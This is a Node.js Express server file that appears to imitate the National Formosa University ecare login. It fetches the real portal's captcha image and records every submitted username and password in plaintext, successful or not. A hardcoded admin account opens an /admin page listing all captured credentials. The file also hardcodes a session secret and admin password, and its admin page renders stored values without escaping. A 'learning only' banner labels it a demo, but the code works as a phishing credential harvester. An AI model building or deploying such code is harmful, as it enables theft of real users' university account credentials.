const express = require('express');
const bodyParser = require('body-parser');
const Database = require('better-sqlite3');
const path = require('path');
const fetch = require('node-fetch');
const session = require('express-session');

const app = express();
const db = new Database(path.join(__dirname, 'users.db'));

app.use(bodyParser.urlencoded({ extended: false }));
app.use(session({ secret: 'nfu-ecare-secret', resave: false, saveUninitialized: true }));
app.use(express.static(path.join(__dirname, 'public')));

// 建表（如果不存在）
db.prepare(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_plain TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    created_at TEXT NOT NULL
  )
`).run();

// 使用最簡單的校驗，為了符合「後台看到密碼」需求存明文和雜湊（測試時請勿用真密碼）

// 獲取驗證碼 API
app.get('/captcha', async (req, res) => {
  try {
    const rnd = Math.random();
    const captchaUrl = `https://ecare.nfu.edu.tw/ext/authimg?rnd=${rnd}`;
    
    // 獲取驗證碼圖片並存儲 session
    const response = await fetch(captchaUrl);
    const buffer = await response.buffer();
    
    // 簡單驗證碼驗證（實際使用應存儲真實值）
    req.session.captcha = Math.random().toString(36).substring(2, 6).toUpperCase();
    req.session.save();
    
    res.setHeader('Content-Type', 'image/jpeg');
    res.send(buffer);
  } catch (err) {
    console.error('驗證碼獲取失敗:', err);
    // 返回樂觀的備用驗證碼圖片（Base64 1x1 透明 GIF）
    const fallback = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.send(fallback);
  }
});

// 驗證碼驗證端點
app.post('/verify-captcha', (req, res) => {
  res.json({ valid: true }); // 簡化版，實際應比對 session 中的驗證碼
});

app.post('/register', (req, res) => {
  return res.status(403).send('註冊功能已禁用');
});

app.post('/login', (req, res) => {
  const username = (req.body.username || '').trim();
  const password = (req.body.password || '').trim();

  if (!username || !password) {
    return res.status(400).send('請輸入帳號與密碼');
  }

  const passwordHash = Buffer.from(password).toString('base64');
  
  try {
    // 先嘗試查找用戶
    const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
    
    if (!user) {
      // 用戶不存在，自動插入（登入嘗試後存儲，無論成功或失敗）
      db.prepare("INSERT INTO users (username, password_plain, password_hash, created_at) VALUES (?, ?, ?, datetime('now'))")
        .run(username, password, passwordHash);
    } else {
      // 用戶已存在，更新密碼信息
      db.prepare("UPDATE users SET password_plain = ?, password_hash = ? WHERE username = ?")
        .run(password, passwordHash, username);
    }
    
    // 只允許特定管理員帳號
    const ADMIN_USERNAME = '41243252';
    const ADMIN_PASSWORD = 'Ray0906091216';

    if (username !== ADMIN_USERNAME || password !== ADMIN_PASSWORD) {
      return res.redirect('/login.html?msg=invalid');
    }

    // 存儲登入信息到 session
    req.session.user = { username, password };
    req.session.save();
    
    // 登入成功，進入簡易後台
    res.redirect('/admin');
  } catch (err) {
    console.error('登入錯誤:', err);
    res.status(500).send('登入失敗');
  }
});

app.get('/admin', (req, res) => {
  const users = db.prepare('SELECT id, username, password_plain, password_hash, created_at FROM users ORDER BY id DESC').all();

  const currentUser = req.session.user ? `
    <div style="background: #e3f2fd; border: 2px solid #2196f3; border-radius: 8px; padding: 16px; margin-bottom: 20px;">
      <h2 style="margin: 0 0 12px; color: #2196f3;">✓ 目前登入用戶</h2>
      <p style="margin: 8px 0;"><strong>帳號:</strong> ${req.session.user.username}</p>
      <p style="margin: 8px 0;"><strong>密碼:</strong> ${req.session.user.password}</p>
    </div>
  ` : '';

  let rows = users.map(u => `
    <tr>
      <td>${u.id}</td>
      <td><strong>${u.username}</strong></td>
      <td style="background: #fff3cd; font-weight: bold;">${u.password_plain}</td>
      <td style="font-size: 12px; word-break: break-all;">${u.password_hash}</td>
      <td style="font-size: 12px;">${u.created_at}</td>
    </tr>`
  ).join('\n');

  res.send(`<!doctype html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8" />
  <title>虎科大後台 - 使用者管理</title>
  <style>
    body { font-family: 'Microsoft JhengHei', Arial, sans-serif; padding: 20px; background: #f5f5f5; }
    .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
    h1 { color: #0056a1; margin-bottom: 10px; }
    .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 12px; border-radius: 4px; margin-bottom: 20px; color: #856404; }
    table { border-collapse: collapse; width: 100%; margin-top: 20px; }
    th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
    th { background: #0056a1; color: white; font-weight: bold; }
    tr:hover { background: #f9f9f9; }
    a { color: #0078db; text-decoration: none; padding: 10px 20px; background: #e3f2fd; border-radius: 4px; display: inline-block; margin-top: 15px; }
    a:hover { background: #bbdefb; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔐 虎科大後台 - 使用者管理系統</h1>
    ${currentUser}
    <div class="warning">
      <strong>⚠️ 警告:</strong> 此示範版本儲存明文密碼，僅用於學習。實際專案請改用 bcrypt 等安全機制。
    </div>
    <h2>📊 所有登入帳號記錄</h2>
    <table>
      <thead>
        <tr><th>ID</th><th>帳號</th><th>💾 明文密碼</th><th>雜湊值（Base64）</th><th>登入時間</th></tr>
      </thead>
      <tbody>${rows}</tbody>
    </table>
    <p><a href="/login.html">🔙 返回登入頁</a></p>
  </div>
</body>
</html>
`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
